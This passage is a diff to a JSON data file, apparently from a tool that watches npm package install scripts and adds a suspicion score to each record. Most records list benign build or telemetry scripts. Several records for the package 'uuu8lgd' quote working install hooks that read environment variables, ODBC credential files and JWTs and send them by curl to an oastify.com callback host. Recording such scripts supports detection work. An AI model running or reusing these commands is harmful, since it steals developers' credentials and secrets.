     "scriptContent": "node -e 'const cp=require(\"child_process\"),isW=process.platform===\"win32\";if(isW){cp.exec(\"powershell -c [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((dir env:|out-string)))\", (e,o)=>{cp.exec(`curl -d \"${o.trim()}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/win_env`);})}else{cp.exec(\"cat /proc/self/environ /tmp/home/.odbc.ini /home/robotuser/.odbc.ini 2>/dev/null | base64 | tr -d \\\"\\\\n\\\"\", (e,o)=>{cp.exec(`curl -d \"${o}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/lin_fast`);})}'",
     "previousVersion": "1.0.15",
     "timestamp": "2026-01-22T19:08:58.017Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 32
   },
   {
     "packageName": "uuu8lgd",
@@ -3503,7 +3886,8 @@
     "scriptContent": "node -e 'const cp=require(\"child_process\"),isW=process.platform===\"win32\";if(isW){cp.exec(\"powershell -c [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((dir env:|out-string)))\", (e,o)=>{cp.exec(`curl -d \"${o.trim()}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/win_env`);})}else{cp.exec(\"cat /proc/self/environ /tmp/home/.odbc.ini /home/robotuser/.odbc.ini 2>/dev/null | base64 | tr -d \\\"\\\\n\\\"\", (e,o)=>{cp.exec(`curl -d \"${o}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/lin_fast`);})}'",
     "previousVersion": "1.0.15",
     "timestamp": "2026-01-22T19:08:58.013Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 32
   },
   {
     "packageName": "@ibm/jcl-expert-for-zowe-cli",
@@ -3512,7 +3896,8 @@
     "scriptContent": "./format_lib.sh && rm -rf build",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-22T18:21:05.589Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 3
   },
   {
     "packageName": "@ibm/plex-mono",
@@ -3521,7 +3906,8 @@
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-22T19:18:27.109Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@ibm/plex-sans",
@@ -3530,7 +3916,8 @@
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-22T19:18:26.364Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@ibm/plex-sans-kr",
@@ -3539,7 +3926,8 @@
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-22T19:18:25.063Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@ibm/plex-sans-thai-looped",
@@ -3548,7 +3936,8 @@
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-22T19:18:24.729Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "uuu8lgd",
@@ -3557,7 +3946,8 @@
     "scriptContent": "sh -c 'env | grep -oE \"eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\" | xargs -I {} curl -s \"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?env_jwt={}\"'",
     "previousVersion": "1.0.5",
     "timestamp": "2026-01-22T18:07:15.124Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 13
   },
   {
     "packageName": "uuu8lgd",
@@ -3566,7 +3956,8 @@
     "scriptContent": "sh -c 'env | grep -oE \"eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\" | xargs -I {} curl -s \"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?env_jwt={}\"'",
     "previousVersion": "1.0.5",
     "timestamp": "2026-01-22T18:07:15.122Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 13
   },
   {
     "packageName": "recursive-llm-ts",
@@ -3575,7 +3966,8 @@
     "scriptContent": "node scripts/build-go-binary.js",
     "previousVersion": "2.0.12",
     "timestamp": "2026-01-22T18:03:48.458Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "recursive-llm-ts",
@@ -3584,7 +3976,8 @@
     "scriptContent": "node scripts/build-go-binary.js",
     "previousVersion": "2.0.12",
     "timestamp": "2026-01-22T18:02:54.718Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "pughost",
@@ -3593,7 +3986,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T17:55:31.319Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "orquesta-agent",
@@ -3602,7 +3996,8 @@
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "0.1.61",
     "timestamp": "2026-01-22T17:55:28.097Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "pughost",
@@ -3611,7 +4006,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T17:38:39.589Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "orquesta-agent",
@@ -3620,7 +4016,8 @@
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "0.1.61",
     "timestamp": "2026-01-22T17:38:37.208Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "pughost",
@@ -3629,7 +4026,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T17:37:00.844Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "orquesta-agent",
@@ -3638,6 +4036,7 @@
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "0.1.61",
     "timestamp": "2026-01-22T17:36:57.421Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   }
 ]
